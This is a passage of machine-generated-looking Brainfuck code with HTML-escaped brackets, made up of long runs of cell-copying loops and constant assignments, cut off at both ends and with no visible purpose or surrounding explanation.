t;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;]&lt;&lt;[-&gt;&gt;+&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;&lt;[-&gt;&gt;&gt;+&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]----------------------------&gt;[-]+++++&gt;[-]--------------------------------------------------------------------------------------------------&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&gt;[-]+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;[-&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;[-&gt;&gt;&gt;&gt;&gt;&gt;-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;+&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]&lt;&lt;&